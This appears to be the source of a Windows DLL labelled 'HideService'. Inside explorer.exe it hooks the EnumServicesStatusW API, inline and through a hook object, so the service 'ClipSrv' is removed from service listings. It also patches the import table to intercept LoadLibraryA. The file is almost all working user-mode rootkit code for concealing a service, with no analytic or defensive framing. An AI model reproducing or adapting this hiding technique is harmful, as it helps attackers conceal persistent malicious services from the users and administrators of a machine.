// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "HookEngine.h"
#include <Psapi.h>
#include "APIHook.h"
#include <Dbghelp.h>

#pragma comment(lib, "Psapi.lib")

ULONG GetEnumServiceInfo = 0;

CRITICAL_SECTION m_lock;

extern CAPIHook g_EnumServicesStatusW;
//extern CAPIHook g_NotifyIPChange;

typedef
WINADVAPI
BOOL
(WINAPI *LPFUN_ENUMSERVICESTATUSW)(
    __in            SC_HANDLE               hSCManager,
    __in            DWORD                   dwServiceType,
    __in            DWORD                   dwServiceState,
    __out_bcount_opt(cbBufSize)
                    LPENUM_SERVICE_STATUSW  lpServices,
    __in            DWORD                   cbBufSize,
    __out           LPDWORD                 pcbBytesNeeded,
    __out           LPDWORD                 lpServicesReturned,
    __inout_opt     LPDWORD                 lpResumeHandle
    );


BOOL
WINAPI
NewEnumServicesStatusW(
    __in            SC_HANDLE               hSCManager,
    __in            DWORD                   dwServiceType,
    __in            DWORD                   dwServiceState,
    __out_bcount_opt(cbBufSize)
                    LPENUM_SERVICE_STATUSW  lpServices,
    __in            DWORD                   cbBufSize,
    __out           LPDWORD                 pcbBytesNeeded,
    __out           LPDWORD                 lpServicesReturned,
    __inout_opt     LPDWORD                 lpResumeHandle
    )
{
		BOOL bResult = FALSE; 

		OutputDebugStringA ("[HideService]: NewEnumServicesStatusW Enter.\n");

		bResult = ((LPFUN_ENUMSERVICESTATUSW)(PROC) g_EnumServicesStatusW)(hSCManager,dwServiceType, dwServiceState,lpServices, cbBufSize, pcbBytesNeeded, lpServicesReturned, lpResumeHandle);	

		bool bExits = false;
		int i = 0;
		int count = *lpServicesReturned;
		for(i; i < count;i++)
		{
			OutputDebugPrintfW (L"[HideService]: Server Name = %s.", lpServices[i].lpServiceName);

			if (wcsicmp (lpServices[i].lpServiceName, L"ClipSrv") == 0){
				bExits = true;
				break;	
			}
		}

		for (i; i < count; i++)
		{
			if (i < (count - 1)){
				lpServices[i] = lpServices[i+1];
			}
		}

		if (bExits) {
			*lpServicesReturned = count - 1;
		}

		return bResult;
}

#ifndef _WIN64
NAKED_PROXY_FUNCTION(MMCEnumSeriveStatusW, NewEnumServicesStatusW)
#endif //

void hook()
{	
	if(GetModuleHandle("Advapi32.dll") == NULL){
		return;
	}

	GetEnumServiceInfo = (ULONG)(GetProcAddress(::GetModuleHandleA( "Advapi32.dll"), "EnumServicesStatusW")); 
#ifndef _WIN64	
	JmpHook(GetEnumServiceInfo, (ULONG)MMCEnumSeriveStatusW);
#endif //
}

void StartInlineHook ()
{
	char baseName[20];
	GetModuleBaseName(GetCurrentProcess(), NULL, baseName, 20);
	if(stricmp(baseName, "explorer.exe") == 0)
	{
		InitializeCriticalSection(&m_lock);
		hook ();
	}
}

typedef
WINBASEAPI
__out_opt
HMODULE
(WINAPI * LPFUN_LOADLIBRARYA)(
    __in LPCSTR lpLibFileName
    );

LPFUN_LOADLIBRARYA LpfunLoadLibraryA = (LPFUN_LOADLIBRARYA)LoadLibraryA;

HMODULE
WINAPI
NewLoadLibraryA(
    __in LPCSTR lpLibFileName
    )
{
	OutputDebugPrintf ("[HideService]: NewLoadLibraryA LibName = %s.", lpLibFileName);
	return ((LPFUN_LOADLIBRARYA)LpfunLoadLibraryA)(lpLibFileName);
}

void StartIATHook ()
{
	char baseName[20];
	GetModuleBaseName(GetCurrentProcess(), NULL, baseName, 20);
	if(stricmp(baseName, "explorer.exe") != 0)
		return;

	char *functionName = "LoadLibraryA";
	PROC pfnNew = (PROC)NewLoadLibraryA;

	OutputDebugStringW (L"StartHook Entry.\n");

	HMODULE hModule = GetModuleHandle (NULL);
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeaders->OptionalHeader);

	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE *)hModule + pOptHeader->DataDirectory[1].VirtualAddress);

	while (pImportDesc->FirstThunk)
	{
		char *dllName= (char *)((BYTE *)hModule + pImportDesc->Name);

		PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc->FirstThunk);
		PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc->OriginalFirstThunk);

		if (lstrcmpi((LPCSTR)dllName, "Advapi32.dll") != 0 && 
			lstrcmpi((LPCSTR)dllName, "Kernel32.dll") != 0) {
			pImportDesc++;
			continue;
		}

		//
		// 确保函数不是以序号导入的。
		//
		if ((pOriginalThunk->u1.ForwarderString & IMAGE_ORDINAL_FLAG32) != 0){
			OutputDebugStringA ("IMAGE_ORDINAL_FLAG32.\n");
			pImportDesc++;
			continue;
		}

		while (pOriginalThunk->u1.Function)
		{
			PIMAGE_IMPORT_BY_NAME pImageByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)hModule + pOriginalThunk->u1.AddressOfData);

			if (lstrcmpi((LPCSTR)pImageByName->Name, functionName) == 0)
			{
				OutputDebugStringW (L"[HideService]: StartHook Enter.\n");

				DWORD dwAddr;
				MEMORY_BASIC_INFORMATION mbi;
				VirtualQuery ((LPVOID)(&(pFirstThunk->u1.Function)), &mbi, sizeof (mbi));
				VirtualProtect ((LPVOID)(&(pFirstThunk->u1.Function)), sizeof (DWORD), PAGE_READWRITE, &dwAddr);
				WriteProcessMemory (GetCurrentProcess (), (LPVOID)(&(pFirstThunk->u1.Function)), &pfnNew, sizeof (DWORD), NULL);
				VirtualProtect ((LPVOID)(&(pFirstThunk->u1.Function)), sizeof (DWORD), dwAddr, 0);
				return;
			}
			pOriginalThunk++;
			pFirstThunk++;
		}
		pImportDesc++;
	}
}

CAPIHook g_EnumServicesStatusW("Advapi32.dll", "EnumServicesStatusW", (PROC) NewEnumServicesStatusW);

//typedef
//BOOL (* LPFUN_DHCPNOTIFYCONFIGCHANGE)(
//		LPWSTR lpwszServerName,		// 本地机器为NULL
//		LPWSTR lpwszAdapterName,	// 适配器名称
//		BOOL bNewIpAddress,			// TRUE表示更改IP
//		DWORD dwIpIndex,			// 指明第几个IP地址，如果只有该接口只有一个IP地址则为0
//		DWORD dwIpAddress,			// IP地址
//		DWORD dwSubNetMask,		    // 子网掩码
//		int nDhcpAction);			// 对DHCP的操作 0:不修改, 1:启用 DHCP，2:禁用 DHCP
//
//BOOL NewNotifyIPChange(
//		LPWSTR lpwszServerName,		
//		LPWSTR lpwszAdapterName,	
//		BOOL bNewIpAddress,			
//		DWORD dwIpIndex,			
//		DWORD dwIpAddress,			
//		DWORD dwSubNetMask,		    
//		int nDhcpAction)
//{
//
//	BOOL bResult;
//
//	OutputDebugStringA ("[HideService]: NewNotifyIPChange Enter.\n");
//
//	bResult = ((LPFUN_DHCPNOTIFYCONFIGCHANGE)(PROC)g_NotifyIPChange)(lpwszServerName, lpwszAdapterName, bNewIpAddress, dwIpIndex, dwIpAddress, dwSubNetMask, nDhcpAction);
//
//	return bResult;
//}
//
//CAPIHook g_NotifyIPChange("dhcpcsvc.dll", "DhcpNotifyConfigChange", (PROC) NewNotifyIPChange);


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

